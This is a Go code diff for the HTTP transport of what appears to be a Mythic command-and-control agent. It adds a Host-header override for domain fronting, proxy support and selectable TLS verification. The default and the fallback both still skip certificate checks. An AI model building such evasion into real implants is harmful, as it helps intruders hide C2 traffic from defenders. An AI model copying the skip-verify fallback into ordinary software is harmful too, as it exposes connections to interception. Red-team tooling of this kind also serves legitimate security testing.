@@ -8,12 +8,15 @@ import (
 	"crypto/rand"
 	"crypto/sha256"
 	"crypto/tls"
+	"crypto/x509"
 	"encoding/base64"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"io"
 	"log"
 	"net/http"
+	"net/url"
 	"strings"
 	"time"
 
@@ -31,12 +34,13 @@ type HTTPProfile struct {
 	Debug         bool
 	GetEndpoint   string
 	PostEndpoint  string
+	HostHeader    string // Override Host header for domain fronting
 	client        *http.Client
 	CallbackUUID  string // Store callback UUID from initial checkin
 }
 
 // NewHTTPProfile creates a new HTTP profile
-func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepInterval, jitter int, debug bool, getEndpoint, postEndpoint string) *HTTPProfile {
+func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepInterval, jitter int, debug bool, getEndpoint, postEndpoint, hostHeader, proxyURL, tlsVerify string) *HTTPProfile {
 	profile := &HTTPProfile{
 		BaseURL:       baseURL,
 		UserAgent:     userAgent,
@@ -47,22 +51,72 @@ func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepI
 		Debug:         debug,
 		GetEndpoint:   getEndpoint,
 		PostEndpoint:  postEndpoint,
+		HostHeader:    hostHeader,
 	}
 
-	// Create HTTP client with reasonable defaults
+	// Configure TLS based on verification mode
+	tlsConfig := buildTLSConfig(tlsVerify)
+
+	// Configure transport with optional proxy
+	transport := &http.Transport{
+		TLSClientConfig:     tlsConfig,
+		MaxIdleConns:        10,
+		MaxIdleConnsPerHost: 5,
+		IdleConnTimeout:     90 * time.Second,
+	}
+
+	// Configure proxy if specified
+	if proxyURL != "" {
+		if proxyU, err := url.Parse(proxyURL); err == nil {
+			transport.Proxy = http.ProxyURL(proxyU)
+		}
+	}
+
 	profile.client = &http.Client{
-		Timeout: 30 * time.Second,
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{
-				InsecureSkipVerify: true, // For testing - should be configurable
-			},
-			MaxIdleConns:        10,
-			MaxIdleConnsPerHost: 5,
-			IdleConnTimeout:     90 * time.Second,
-		},
+		Timeout:   30 * time.Second,
+		Transport: transport,
 	}
 
 	return profile
+}
+
+// buildTLSConfig creates a TLS configuration based on the verification mode.
+// Modes: "none" (skip verification), "system-ca" (OS trust store), "pinned:<hex-sha256>" (cert pin)
+func buildTLSConfig(tlsVerify string) *tls.Config {
+	switch {
+	case tlsVerify == "system-ca":
+		// Use the operating system's certificate trust store
+		return &tls.Config{
+			InsecureSkipVerify: false,
+			MinVersion:         tls.VersionTLS12,
+		}
+	case strings.HasPrefix(tlsVerify, "pinned:"):
+		// Pin to a specific certificate SHA-256 fingerprint
+		fingerprint := strings.TrimPrefix(tlsVerify, "pinned:")
+		expectedHash, err := hex.DecodeString(fingerprint)
+		if err != nil || len(expectedHash) != 32 {
+			// Invalid fingerprint — fall back to skip verify to avoid bricking the agent
+			return &tls.Config{InsecureSkipVerify: true}
+		}
+		return &tls.Config{
+			InsecureSkipVerify: true, // We do our own verification in VerifyPeerCertificate
+			MinVersion:         tls.VersionTLS12,
+			VerifyPeerCertificate: func(rawCerts [][]byte, _ [][]*x509.Certificate) error {
+				if len(rawCerts) == 0 {
+					return fmt.Errorf("no certificates presented")
+				}
+				// Hash the leaf certificate's raw DER bytes
+				hash := sha256.Sum256(rawCerts[0])
+				if !bytes.Equal(hash[:], expectedHash) {
+					return fmt.Errorf("certificate fingerprint mismatch")
+				}
+				return nil
+			},
+		}
+	default:
+		// "none" or unrecognized — skip verification (backward compatible default)
+		return &tls.Config{InsecureSkipVerify: true}
+	}
 }
 
 // Checkin performs the initial checkin with Mythic
@@ -493,6 +547,11 @@ func (h *HTTPProfile) makeRequest(method, path string, body []byte) (*http.Respo
 	req.Header.Set("User-Agent", h.UserAgent)
 	req.Header.Set("Content-Type", "text/plain")
 	req.Header.Set("Accept", "*/*")
+
+	// Override Host header for domain fronting
+	if h.HostHeader != "" {
+		req.Host = h.HostHeader
+	}
 
 	if h.Debug {
 		// log.Printf("[DEBUG] Making %s request to %s", method, url)
